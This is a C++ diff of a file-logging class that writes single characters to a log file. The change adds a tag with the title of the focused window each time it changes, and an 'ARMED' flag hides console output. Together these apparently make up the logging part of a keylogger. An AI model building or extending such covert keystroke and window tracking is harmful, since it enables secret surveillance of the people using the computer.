@@ -3,21 +3,23 @@
 
 bool logFILE::log(const wchar_t& c) {
 	if (!m_working) return false;
+	logwindow();
 	if constexpr (!ARMED) std::wcout << c;
 	m_file << c;
-	bufferFlush();
+	flush();
 	return true;
 }
 
 bool logFILE::log(const std::wstring& str) {
 	if (!m_working) return false;
+	logwindow();
 	if constexpr (!ARMED) std::wcout << str;
 	m_file << str;
-	bufferFlush();
+	flush();
 	return true;
 }
 
-void logFILE::bufferFlush() {
+void logFILE::flush() {
 	static short counter = 0;
 	if (counter < FLUSH_FREQUENCY) counter++;
 	else {
@@ -27,14 +29,20 @@ void logFILE::bufferFlush() {
 	}
 }
 
-void logFILE::init(const std::string& logFileName) {
-	m_fname = logFileName;
+void logFILE::logwindow() {
+	if (m_working && updateFocusedWindow(m_wname)) {
+		std::wstring tolog = L"\n[new window: ";
+		tolog += m_wname;
+		tolog += L"]\t";
+
+		if constexpr (!ARMED) std::wcout << tolog;
+		m_file << tolog;
+	}
+}
+
+logFILE::logFILE(const std::string& fname) {
+	m_fname = fname;
 	m_file.open(m_fname, std::fstream::app);
 	m_file.imbue(std::locale("de-DE"));
 	m_working = m_file.is_open();
-}
-
-logFILE& logFILE::get() {
-	static logFILE l;
-	return l;
 }
